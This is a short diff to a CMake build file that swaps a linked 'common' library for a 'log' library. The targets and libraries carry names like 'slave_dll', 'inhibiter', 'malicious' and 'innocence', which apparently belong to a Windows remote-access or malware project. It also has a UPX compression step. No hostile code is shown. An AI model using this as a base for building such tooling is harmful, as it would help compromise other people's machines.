@@ -3,7 +3,7 @@ set(SLAVE_DLL_TARGET "slave_dll")
 file(GLOB_RECURSE slave_dll_source_files dll/*)
 add_library(${SLAVE_DLL_TARGET} SHARED ${slave_dll_source_files})
 set_target_properties(${SLAVE_DLL_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS PROJECT_MODULE="${SLAVE_DLL_TARGET}")
-target_link_libraries(${SLAVE_DLL_TARGET} system network blaspheme malicious common userenv)
+target_link_libraries(${SLAVE_DLL_TARGET} system network blaspheme malicious log userenv)
 
 add_custom_command(
 	TARGET ${SLAVE_DLL_TARGET}
@@ -19,7 +19,7 @@ add_executable(${INHIBITER_TARGET} WIN32 ${inhibiter_source_files})
 set_target_properties(${INHIBITER_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS PROJECT_MODULE="${INHIBITER_TARGET}")
 
 # substrate has to be built before inhibiter, because of resource inclusion
-target_link_libraries(${INHIBITER_TARGET} common malicious system network slave_dll shlwapi)
+target_link_libraries(${INHIBITER_TARGET} log malicious system network slave_dll shlwapi)
 # install(TARGETS ${INHIBITER_TARGET} RUNTIME DESTINATION innocence)
 
 # UPX Compression
